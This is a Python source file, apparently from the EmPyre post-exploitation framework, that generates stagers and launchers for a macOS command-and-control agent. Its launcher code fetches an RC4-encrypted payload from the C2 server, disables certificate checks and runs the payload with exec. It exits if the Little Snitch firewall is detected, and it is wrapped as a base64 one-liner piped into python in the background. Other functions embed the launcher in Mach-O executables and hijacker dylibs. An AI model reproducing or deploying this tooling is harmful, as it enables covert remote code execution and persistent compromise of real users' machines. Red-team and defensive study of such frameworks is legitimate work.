"""

Stager handling functionality for EmPyre.

"""

import fnmatch
import imp
import http
import helpers
import encryption
import os
import base64


class Stagers:

    def __init__(self, MainMenu, args):
        print 'init'
        self.mainMenu = MainMenu

        # pull the database connection object out of the main menu
        self.conn = self.mainMenu.conn

        self.args = args

        # stager module format:
        #     [ ("stager_name", instance) ]
        self.stagers = {}

        # pull out the code install path from the database config
        cur = self.conn.cursor()

        cur.execute("SELECT install_path FROM config")
        self.installPath = cur.fetchone()[0]

        cur.execute("SELECT default_profile FROM config")
        self.userAgent = (cur.fetchone()[0]).split("|")[1]

        cur.close()

        # pull out staging information from the main menu
        self.stage0 = self.mainMenu.stage0
        self.stage1 = self.mainMenu.stage1
        self.stage2 = self.mainMenu.stage2

        self.load_stagers()

    def load_stagers(self):
        print 'load_stagers'
        """
        Load stagers from the install + "/lib/stagers/*" path
        """

        rootPath = self.installPath + 'lib/stagers/'
        pattern = '*.py'

        for root, dirs, files in os.walk(rootPath):
            for filename in fnmatch.filter(files, pattern):
                filePath = os.path.join(root, filename)

                # extract just the module name from the full path
                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]

                # instantiate the module and save it to the internal cache
                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])

    def set_stager_option(self, option, value):
        print "set_stager_option"
        """
        Sets an option for all stagers.
        """

        for name, stager in self.stagers.iteritems():
            for stagerOption, stagerValue in stager.options.iteritems():
                if stagerOption == option:
                    stager.options[option]['Value'] = str(value)

    def generate_stager(self, server, key, profile, encrypt=True, encode=False):
        print 'generate_stager'
        """
        Generate the Python stager that will perform
        key negotiation with the server and kick off the agent.
        """

        # TODO: implement for Python

        # read in the stager base
        f = open(self.installPath + "/data/agent/stager.py")
        stager = f.read()
        f.close()

        stager = helpers.strip_python_comments(stager)

        # first line of randomized text to change up the ending RC4 string
        randomHeader = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
        stager = randomHeader + stager

        if server.endswith("/"):
            server = server[0:-1]

        # # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("REPLACE_PROFILE", profile)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        # # base64 encode the stager and return it
        # if encode:
        #     return ""
        if encrypt:
            # return an encrypted version of the stager ("normal" staging)
            # return encryption.xor_encrypt(stager, key)
            return encryption.rc4(key, stager)
        else:
            # otherwise return the case-randomized stager
            return stager

    def generate_stager_hop(self, server, key, profile, encrypt=True, encode=True):
        print 'generate_stager_hop'
        """
        Generate the Python stager for hop.php redirectors that
        will perform key negotiation with the server and kick off the agent.
        """

        # read in the stager base
        f = open(self.installPath + "./data/agent/stager_hop.py")
        stager = f.read()
        f.close()

        stager = helpers.strip_python_comments(stager)

        # first line of randomized text to change up the ending RC4 string
        randomHeader = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
        stager = randomHeader + stager

        # patch the server and key information
        stager = stager.replace("REPLACE_SERVER", server)
        stager = stager.replace("REPLACE_STAGING_KEY", key)
        stager = stager.replace("REPLACE_PROFILE", profile)
        stager = stager.replace("index.jsp", self.stage1)
        stager = stager.replace("index.php", self.stage2)

        # # base64 encode the stager and return it
        # if encode:
        #     return ""
        if encrypt:
            # return an encrypted version of the stager ("normal" staging)
            # return encryption.xor_encrypt(stager, key)
            return encryption.rc4(key, stager)
        else:
            # otherwise return the case-randomized stager
            return stager

    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
        print 'generate_agent'
        """
        Generate "standard API" functionality, i.e. the actual agent.py that runs.

        This should always be sent over encrypted comms.
        """

        f = open(self.installPath + "./data/agent/agent.py")
        code = f.read()
        f.close()

        # strip out comments and blank lines
        code = helpers.strip_python_comments(code)

        b64DefaultPage = base64.b64encode(http.default_page())

        # patch in the delay, jitter, lost limit, and comms profile
        code = code.replace('delay = 60', 'delay = %s' % (delay))
        code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
        code = code.replace('profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
        code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
        code = code.replace('defaultPage = base64.b64decode("")', 'defaultPage = base64.b64decode("%s")' % (b64DefaultPage))

        # patch in the killDate and workingHours if they're specified
        if killDate != "":
            code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
        if workingHours != "":
            code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

        return code

    def generate_launcher_uri(self, server, encode=True, pivotServer="", hop=False):
        print 'generate_launcher_uri'
        """
        Generate a base launcher URI.

        This is used in the management/psinject module.
        """

        if hop:
            # generate the base64 encoded information for the hop translation
            checksum = "?" + helpers.encode_base64(server + "&" + self.stage0)
        else:
            # get a valid staging checksum uri
            checksum = self.stage0

        if pivotServer != "":
            checksum += "?" + helpers.encode_base64(pivotServer)

        if server.count("/") == 2 and not server.endswith("/"):
            server += "/"

        return server + checksum

    def generate_launcher(self, listenerName, encode=True, userAgent="default", littlesnitch='True'):
        print 'generate_launcher'
        """
        Generate the initial Python 'download cradle' with a specified
        c2 server and a valid HTTP checksum.

        listenerName -> a name of a validly registered listener

        userAgent ->    "default" uses the UA from the default profile in the database
                        "none" sets no user agent
                        any other text is used as the user-agent
        """

        # if we don't have a valid listener, return nothing
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        # extract the staging information from this specified listener
        (server, stagingKey, pivotServer, hop) = self.mainMenu.listeners.get_stager_config(listenerName)

        # if UA is 'default', use the UA from the default profile in the database
        if userAgent.lower() == "default":
            userAgent = self.userAgent

        # get the launching stage0 URI
        stage0uri = self.generate_launcher_uri(server, encode, pivotServer, hop)

        # adopted from MSF's python meterpreter staging
        #   https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/python/reverse_http.rb

        # first line of randomized text to change up the ending RC4 string
        launcherBase = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())

        if "https" in stage0uri:
            # monkey patch ssl woohooo
            launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

        launcherBase += "import sys, urllib2;"
        try:
            if littlesnitch.lower() == 'true':
                launcherBase += "import re, subprocess;"
                launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                launcherBase += "out = ps.stdout.read()\n"
                launcherBase += "ps.stdout.close()\n"
                launcherBase += "if re.search(\"Little Snitch\", out):\n"
                launcherBase += "   sys.exit()\n"
        except Exception as e:
            p = "[!] Error setting LittleSnitch in stagger: " + str(e)
            print helpers.color(p, color="Yellow")

        
        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
        launcherBase += "UA='%s';" % (userAgent)
        launcherBase += "o.addheaders=[('User-Agent',UA)];"
        launcherBase += "a=o.open('%s').read();" % (stage0uri)
        launcherBase += "key='%s';" % (stagingKey)
        # RC4 decryption
        launcherBase += "S,j,out=range(256),0,[]\n"
        launcherBase += "for i in range(256):\n"
        launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
        launcherBase += "    S[i],S[j]=S[j],S[i]\n"
        launcherBase += "i=j=0\n"
        launcherBase += "for char in a:\n"
        launcherBase += "    i=(i+1)%256\n"
        launcherBase += "    j=(j+S[i])%256\n"
        launcherBase += "    S[i],S[j]=S[j],S[i]\n"
        launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
        launcherBase += "exec(''.join(out))"

        # base64 encode the stager and return it
        if encode:
            launchEncoded = base64.b64encode(launcherBase)
            # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
            return launcher
        else:
            return launcherBase

    def generate_hop_php(self, server, resources):
        print 'generate_hop_php'
        """
        Generates a hop.php file with the specified target server
        and resource URIs.
        """

        # read in the hop.php base
        f = open(self.installPath + "/data/misc/hop.php")
        hop = f.read()
        f.close()

        # make sure the server ends with "/"
        if not server.endswith("/"):
            server += "/"

        # patch in the server and resources
        hop = hop.replace("REPLACE_SERVER", server)
        hop = hop.replace("REPLACE_RESOURCES", resources)

        return hop

    def generate_macho(self, launcherCode):
        print 'generate_macho'

        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code
        """

        import macholib.MachO

        MH_EXECUTE = 2
        f = open(self.installPath + "/data/misc/machotemplate", 'rb')
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 13

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedMachO
        else:
            print helpers.color("[!] Unable to patch MachO binary")

    def generate_dylib(self, launcherCode, arch, hijacker):
        print 'generate_dylib'
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        import macholib.MachO

        MH_DYLIB = 6
        if hijacker.lower() == 'true':
            if arch == 'x86':
                f = open(self.installPath + "/data/misc/hijackers/template.dylib", "rb")
            else:
                f = open(self.installPath + "/data/misc/hijackers/template64.dylib", "rb")
        else:
            if arch == 'x86':
                f = open(self.installPath + "/data/misc/templateLauncher.dylib", "rb")
            else:
                f = open(self.installPath + "/data/misc/templateLauncher64.dylib", "rb")
        
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_DYLIB:
            print helpers.color("[!] Dylib template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52
        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedDylib
        else:
            print helpers.color("[!] Unable to patch dylib")
